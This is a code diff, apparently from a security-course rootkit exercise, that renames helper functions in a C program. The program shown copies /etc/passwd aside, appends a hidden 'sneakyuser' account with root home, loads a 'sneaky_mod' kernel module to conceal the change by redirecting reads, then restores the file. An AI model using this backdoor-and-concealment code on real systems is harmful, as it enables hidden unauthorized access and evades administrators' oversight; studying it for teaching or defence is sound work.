@@ -10,7 +10,7 @@
 #define TEMP_PASSWD_FILE "/tmp/passwd"
 
 // here write a function to copy the source file to the destination path
-void copy_file(const char *src, const char *dest) {
+void copyPwd(const char *src, const char *dest) {
     int src_fd;
     int dest_fd;
     ssize_t n_read;
@@ -49,7 +49,7 @@ void copy_file(const char *src, const char *dest) {
 }
 
 // here write a function to add one more line to the original file
-void append_to_file(const char *filename, const char *content) {
+void addPwd(const char *filename, const char *content) {
     int fd = open(filename, O_WRONLY | O_APPEND);
     if (fd < 0) {
         perror("Failed to open file for appending");
@@ -68,11 +68,11 @@ int main() {
 
     // copy the orginial /etc/passwd to the temp pwd file to save the original file
     // the openat in sneaky_mod will redirect to the temp pwd file(original) if the user want to check the pwd file
-    copy_file("/etc/passwd", TEMP_PASSWD_FILE);
+    copyPwd("/etc/passwd", TEMP_PASSWD_FILE);
     
     // add one more line of sneaky user
     const char *sneaky_user = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
-    append_to_file("/etc/passwd", sneaky_user);
+    addPwd("/etc/passwd", sneaky_user);
     
     char cmd[256];
     sprintf(cmd, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
@@ -86,7 +86,7 @@ int main() {
     system("rmmod sneaky_mod.ko");
     
     // copy the orginial pwd to the original pwd file to recover
-    copy_file(TEMP_PASSWD_FILE, "/etc/passwd");
+    copyPwd(TEMP_PASSWD_FILE, "/etc/passwd");
     // delete the temp file
     system("rm " TEMP_PASSWD_FILE);
     
